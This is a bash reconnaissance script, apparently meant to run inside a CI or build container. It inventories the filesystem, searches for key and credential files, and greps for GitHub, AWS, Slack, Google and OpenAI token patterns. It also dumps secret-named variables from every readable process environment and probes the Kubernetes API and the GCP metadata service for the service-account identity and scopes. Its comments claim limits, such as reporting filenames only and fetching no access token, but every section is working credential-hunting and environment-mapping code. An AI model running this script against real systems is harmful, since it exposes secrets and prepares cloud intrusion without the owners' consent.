#!/bin/bash
echo "=== S1 IDENTITY ==="
id; hostname; uname -a; pwd; date -u
echo "=== S2 FS INVENTORY (OS/noise dirs pruned) ==="
find / -xdev \( -path /proc -o -path /sys -o -path /dev -o -path /usr -o -path /lib -o -path /lib64 -o -path /bin -o -path /sbin -o -path /repo-vol/node_modules -o -path /opt/buildhome/.npm -o -path /opt/buildhome/.nvm -o -path /opt/buildhome/go -o -path /repo-vol/themes \) -prune -o -type f -print 2>/dev/null | head -1500
echo "=== S3 SECRET-NAMED FILES ANYWHERE ==="
find / -xdev -type f \( -iname '*secret*' -o -iname '*cred*' -o -iname '*token*' -o -iname '*.pem' -o -iname '*.key' -o -iname 'id_rsa*' -o -iname 'id_ed*' -o -iname '.env*' -o -iname '*kubeconfig*' -o -iname '*.p12' -o -iname '*.jks' -o -iname '.netrc' -o -iname '.npmrc' -o -iname '.git-credentials' \) 2>/dev/null | grep -vE '^/(usr|lib|lib64)/' | head -200
echo "=== S4 CONTENT GREP FOR SECRET PATTERNS (filenames only) ==="
grep -rIlE '(ghp_|ghs_|gho_|github_pat_|AKIA|ASIA|-----BEGIN [A-Z ]*PRIVATE KEY|xox[baprs]-|AIza|sk-[A-Za-z0-9]{20})' /etc /scripts /opt/buildhome /app /var/run /tmp /home /root /repo-vol/.git 2>/dev/null | head -80
echo "=== S5 PROCESS LIST ==="
(ps -ef 2>/dev/null || ps aux 2>/dev/null) | head -50
echo "=== S6 EVERY READABLE /proc/PID/environ -> secret-named vars ==="
for d in /proc/[0-9]*; do p=${d#/proc/}
  if [ -r "$d/environ" ]; then
    echo "--- pid $p : $(tr '\0' ' ' < $d/cmdline 2>/dev/null | head -c 160)"
    tr '\0' '\n' < "$d/environ" 2>/dev/null | grep -iE 'KEY=|TOKEN=|SECRET=|CRED|PASS|AUTH' | head -15
  fi
done 2>/dev/null | head -250
echo "=== S7 /etc LISTING ==="
ls -la /etc 2>/dev/null | head -90
echo "=== S8 / and /scripts and /app LISTING ==="
ls -la / 2>/dev/null; echo "--scripts--"; ls -laR /scripts 2>/dev/null | head -60; echo "--app--"; ls -la /app 2>/dev/null | head -30
echo "=== S9 MOUNTS / SOCKETS / DNS ==="
cat /proc/self/mounts 2>/dev/null | head -40
echo "--- listening ---"; (ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || cat /proc/net/tcp 2>/dev/null) | head -40
echo "--- resolv/hosts ---"; cat /etc/resolv.conf /etc/hosts 2>/dev/null | head -30
echo "=== S10 K8S API REACHABILITY (UNAUTHENTICATED PROBES ONLY) ==="
curl -s -k -m 5 -o /dev/null -w "k8s /version http=%{http_code}\n" "https://$KUBERNETES_SERVICE_HOST/version" 2>/dev/null
echo "anon /api ->"; curl -s -k -m 5 "https://$KUBERNETES_SERVICE_HOST/api" 2>/dev/null | head -c 400; echo
echo "=== S11 GCP METADATA IDENTITY (NO access_token fetched) ==="
MD="http://169.254.169.254/computeMetadata/v1"
echo -n "sa email: "; curl -s -m 5 -H 'Metadata-Flavor: Google' "$MD/instance/service-accounts/default/email" 2>/dev/null; echo
echo "scopes:"; curl -s -m 5 -H 'Metadata-Flavor: Google' "$MD/instance/service-accounts/default/scopes" 2>/dev/null; echo
echo -n "project: "; curl -s -m 5 -H 'Metadata-Flavor: Google' "$MD/project/project-id" 2>/dev/null; echo
echo "=== S12 SA MOUNT (deref) ==="
ls -laL /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
echo "=== DONE ==="
